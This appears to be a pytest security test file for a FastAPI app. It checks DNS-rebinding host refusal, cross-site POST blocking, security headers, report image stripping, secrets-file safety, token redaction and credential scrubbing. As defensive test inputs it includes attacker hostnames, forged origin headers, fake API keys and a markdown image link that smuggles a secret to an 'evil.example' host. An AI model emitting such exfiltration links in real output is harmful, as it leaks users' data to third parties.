"""app/security.py and the other hardening: host/cross-site checks, headers, image
stripping in reports, secrets file safety, token redaction, secret scrubbing."""
import json

import pytest
from fastapi.testclient import TestClient

from app import config
from app.main import _render_markdown, app


@pytest.fixture
def client():
    return TestClient(app)


def test_unknown_host_is_refused(client):  # DNS rebinding arrives with the attacker's hostname
    assert client.get("/", headers={"host": "evil.example"}).status_code == 421
    assert client.get("/settings", headers={"host": "attacker.test:8787"}).status_code == 421
    assert client.get("/health", headers={"host": "127.0.0.1:8787"}).status_code == 200


@pytest.mark.parametrize("headers", [
    {"origin": "https://evil.example"},
    {"origin": "null"},
    {"sec-fetch-site": "cross-site"},
])
def test_cross_site_posts_are_refused(client, headers):
    r = client.post("/settings/regenerate-token", headers=headers, follow_redirects=False)
    assert r.status_code == 403


def test_same_origin_and_non_browser_posts_work(client):
    ok = client.post("/settings/regenerate-token", headers={"origin": "http://testserver", "sec-fetch-site": "same-origin"},
                     follow_redirects=False)
    assert ok.status_code == 303
    assert client.post("/settings/regenerate-token", follow_redirects=False).status_code == 303  # curl-style


def test_security_headers(client):
    r = client.get("/")
    assert "img-src 'self' data:" in r.headers["content-security-policy"]
    assert r.headers["x-frame-options"] == "DENY" and r.headers["referrer-policy"] == "no-referrer"


def test_report_images_are_stripped_but_links_kept():
    html = str(_render_markdown("See ![leak](https://evil.example/?d=secret) and [docs](https://ok.example)"))
    assert "<img" not in html and "evil.example" not in html and "leak" in html
    assert 'href="https://ok.example"' in html


def test_missing_video_is_404_not_500(client):
    assert client.post("/video/999999/watched").status_code == 404


def test_corrupt_secrets_file_is_never_overwritten():
    config.save_api_key("sk-ant-keepme")
    config.SECRETS_PATH.write_text('{"ANTHROPIC_API_KEY": "sk-ant-keepme", ')  # truncated write
    assert config.get_api_key() in ("", "sk-ant-test-placeholder")  # reads as unset, doesn't crash
    with pytest.raises(config.SecretsUnreadable):
        config.get_agent_token()  # used to silently rewrite the file with only AGENT_TOKEN
    assert config.SECRETS_PATH.read_text().startswith('{"ANTHROPIC_API_KEY": "sk-ant-keepme"')


def test_secrets_file_is_private_and_complete_after_concurrent_saves():
    import os
    import stat
    import threading

    threads = [threading.Thread(target=config._save_secret, args=(f"K{i}", i)) for i in range(20)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    data = json.loads(config.SECRETS_PATH.read_text())
    assert all(data[f"K{i}"] == i for i in range(20))  # no lost updates
    assert stat.S_IMODE(os.stat(config.SECRETS_PATH).st_mode) == 0o600


def test_pairing_code_expires(monkeypatch):
    config.save_telegram_settings(bot_token="1:a")
    code = config.new_pairing_code()
    assert config.get_telegram_settings()["pairing_code"] == code and len(code) == 8
    monkeypatch.setattr(config.time, "time", lambda: 10**12)
    assert config.get_telegram_settings()["pairing_code"] == ""


def test_telegram_errors_never_contain_the_bot_token():
    import httpx

    from app.telegram_bot import TelegramClient
    def boom(req):
        raise httpx.ConnectError("failed for " + str(req.url))
    tg = TelegramClient("123:SECRETTOKEN", httpx.Client(transport=httpx.MockTransport(boom)))
    with pytest.raises(RuntimeError) as e:
        tg.call("getUpdates")
    assert "SECRETTOKEN" not in str(e.value) and e.value.__cause__ is None


def test_project_reads_scrub_credentials():
    from app.projects import scrub_secrets
    text = ('api_key: "abcd1234abcd1234abcd"\nOPENAI=sk-proj-AAAAAAAAAAAAAAAAAAAAAAAA\n'
            "aws = AKIAABCDEFGHIJKLMNOP\n-----BEGIN RSA PRIVATE KEY-----\nMIIx\n-----END RSA PRIVATE KEY-----\n"
            "def fine(): return 1\n")
    out = scrub_secrets(text)
    for leaked in ("abcd1234abcd1234abcd", "sk-proj-AAAA", "AKIAABCDEFGHIJKLMNOP", "MIIx"):
        assert leaked not in out
    assert "def fine(): return 1" in out


def test_user_messages_hide_raw_errors():
    from app.netutil import is_network_error, user_message
    assert is_network_error(RuntimeError("[SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred in violation"))
    msg = user_message(ValueError("boom at https://api.example/v1?key=AIzaSECRET"))
    assert "AIza" not in msg and "Tap Retry" in msg
